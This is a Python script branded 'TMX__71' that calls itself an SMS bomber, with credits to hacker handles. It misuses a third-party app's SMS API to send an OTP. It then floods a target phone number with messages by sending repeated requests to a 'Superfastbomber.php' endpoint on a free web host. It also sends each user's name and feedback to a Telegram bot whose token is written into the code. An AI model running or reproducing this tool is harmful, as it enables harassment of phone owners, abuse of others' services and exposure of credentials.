while True:
    input("[Tools off!]")
import getpass
import os
try:
    import colorama
except ImportError:
    os.system("pip install colorama")
from colorama import *
import random
try:
    import pyfiglet
except ImportError:
    os.system("pip install pyfiglet")
from pyfiglet import *
try:
    import requests
except ImportError:
    os.system("pip install requests")
import requests
init(autoreset=True)
#color

colors = [
    Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA,
    Fore.CYAN, Fore.WHITE, Fore.BLACK, Fore.LIGHTBLACK_EX, Fore.LIGHTRED_EX,
    Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
    Fore.LIGHTCYAN_EX, Fore.LIGHTWHITE_EX, Fore.RESET, Fore.LIGHTRED_EX,
    Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
    Fore.LIGHTCYAN_EX, Fore.LIGHTWHITE_EX, Fore.RESET, Fore.LIGHTRED_EX,
    Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
    Fore.LIGHTCYAN_EX, Fore.LIGHTWHITE_EX, Fore.RESET, Fore.LIGHTRED_EX,
    Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
    Fore.LIGHTCYAN_EX, Fore.LIGHTWHITE_EX, Fore.RESET, Fore.LIGHTRED_EX,
    Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
    Fore.LIGHTCYAN_EX, Fore.LIGHTWHITE_EX
]
#var

commandlisr = ("exit : code off","Type Number and send sms","clear: windo clear")

info = ("\nadmin : Yousuf,Nahid","Telegram : t.me/BDKING84","github : @hackingboyjr","number :.......... ","city : bangladesh")

def send_message(number, text, color1):
    url = "http://202.51.182.198:8181/nbp/sms/code"
    payload = {
        "receiver": number,
        "text": otpcode,
        "title": "Register Account"
    }

    headers = {
        'User-Agent': "okhttp/3.11.0",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json",
        'Authorization': "Bearer",
        'language': "en",
        'timeZone': "Asia/Dhaka"
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.json().get("msg_code") == "operate.success":
        print(color1 + "_______________Otp sent successfully!")
    else:
        print(color1 + "Failed to send otp")


#otp


#var
name = input("Your Name : ")
if name == "":
    name = "Nahid"
number = input("Your Number : ")

rando = random.randint(10000, 999999)
otp = str(rando)
otpcode = f"Dear {name}\n, Your Tmx sms sender one time otp is: {otp}"

send_message(number, otpcode, colors[0]) 

#end
password = str(getpass.getpass("OTP : ")) 
if password == "":
    print("password error. Try agin")

while password == "":
    password = str(getpass.getpass("password : "))  # Prompting for password again until a non-empty value is entered

while True:
    os.system("clear")
    color1 = random.choice(colors)
    color2 = random.choice(colors)
    color3 = random.choice(colors)
    color4 = random.choice(colors)
    #head code
    logo = figlet_format("TMX__71")
    print(color1 + logo)
    line = color3+"Jjj"
    print(color2 + "Telgram      :     t.me/BDKING84")
    print(color3 + "Tools virson :                  11")
    print(color4 + "Tools        :                  sms sender")
    print(color1 + "github       :                  @hackingboyjr")
    
    print("[_________________________________________]")
    #body
    inp = input("root®"+name+"→  ")
    if "exit" == inp:
        exit()
    elif inp == "":
        print("error")
    elif inp == "clear":
        os.system("clear")
    elif inp == "exit":
        exit()
    elif inp == "help":
        print(commandlisr)
        input("[clear]")
    elif inp == "tmx71":
        for tmxinfo in info:
            print(tmxinfo)
        input("[clear]")
    else:
        amu = input("Message amount : ")
        amun = int(amu)
        numbe = 1
        for _ in range(amun):
            colorba1 = random.choice(colors)
            colorba2 = random.choice(colors)
            numcolor = random.choice(colors)
            on1 = colorba1 + "["
            on2 = colorba2 + "]"
            requests.get(f"https://4klidtonum.000webhostapp.com/Superfastbomber.php?Number={inp}&amount={amu}")
            print(on1,numcolor,numbe,on2,numcolor+"Message Send")
            numbe += 1
        print("____________________",Fore.GREEN+"send ok","___________________")
        feedback = input("Your Feedback : ")
        base_url = "https://api.telegram.org/bot6965591022:AAEJJO65bDUhhDbkSrv37Y6yyT-wC5LKmUE/sendMessage"
        chat_id = "6440045115"
        params = {
            "chat_id": chat_id,
                        "chat_id": chat_id,
            "text": f"Name: {name}\nTools Type : sms bomber\n Feedback: {feedback}"
        }
        response = requests.get(base_url, params=params)
        print("____________",Fore.GREEN+"Your Feedback send Successfull")
        ij = input("sms send agin  (y/n) : ")
        if ij == "n":
            exit()  
